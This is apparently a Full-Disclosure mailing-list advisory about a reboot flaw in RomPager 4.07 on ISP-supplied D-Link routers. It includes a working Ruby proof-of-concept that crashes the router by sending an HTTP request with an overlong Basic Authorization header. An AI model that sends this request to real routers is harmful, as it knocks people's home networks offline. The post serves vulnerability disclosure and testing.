Software: "RomPager/4.07 UPnP/1.0"

Issue: A reboot can be caused when a special crafted http request is sent.

Other Details: This version of RomPager is seen on a number of
residential routers that are shipped by a number of different ISP's.
The router I personal know it effects is the d-link DSL-2640R shipped
by virgin media. I also do believe this effects the d-link DSL-2641R.

I have made www.allegrosoft.com aware of the issue ( the creators of
RomPager ) and they have stated that version is very old and out dated
and should no longer be used and they stated they have been un able to
replicate the issue. This would lead me to believe it has something to
do with the ISP's customer firmware, I have contacted virgin media to
make them aware of the issue ( this was over a month ago ) so I am now
making this public.

If other people have a home router running the RomPager 4.07 software
please try the ruby script provided bellow and see if your router
restarts as well then add the make and module of router along with the
location this was obtained.

This is a assumption however I do think this could be further
exploited by close investigation with jtag access to the device,
however at the moment I am guessing the routers software watch dog
kicks in and restarts the router

Ruby Script:

require 'net/https'

url = URI.parse("http://IP/")
data = nil
headers = {
	"Host" => "IP",
	"Authorization" => "Basic
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}
res = Net::HTTP.start(url.host, url.port) do |http|
	http.use_ssl = false
	http.send_request("GET", url.path, data, headers)
end

puts res.body

Regards,
-- Mr R Birtles

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
